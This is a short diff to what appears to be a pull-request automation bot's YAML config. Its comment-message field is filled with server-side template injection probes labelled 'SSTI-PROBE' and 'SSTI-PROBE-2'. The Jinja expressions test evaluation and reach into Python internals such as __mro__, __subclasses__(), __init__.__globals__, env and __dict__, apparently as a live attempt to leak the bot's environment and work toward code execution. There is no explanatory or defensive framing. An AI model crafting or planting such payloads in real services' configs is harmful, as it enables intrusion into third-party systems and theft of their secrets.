@@ -5,11 +5,12 @@ pull_request_rules:
     actions:
       comment:
         message: |
-          SSTI-PROBE
-          mul=[{{ 7*7 }}]
-          prnum=[{{ pr.number }}]
-          auth=[{{ author }}]
-          mro=[{{ ''.__class__.__mro__ }}]
-          nsub=[{{ ''.__class__.__mro__[1].__subclasses__()|length }}]
-          self=[{{ self }}]
-          env=[{{ env }}]
+          SSTI-PROBE-2
+          cls=[{{ __class__ }}]
+          init=[{{ ''.__class__.__init__ }}]
+          globals=[{{ ''.__class__.__init__.__globals__ }}]
+          module=[{{ ''.__class__.__module__ }}]
+          pr=[{{ pr }}]
+          prtitle=[{{ pr.title }}]
+          mro1=[{{ ''.__class__.__mro__[1] }}]
+          dict=[{{ pr.__dict__ }}]
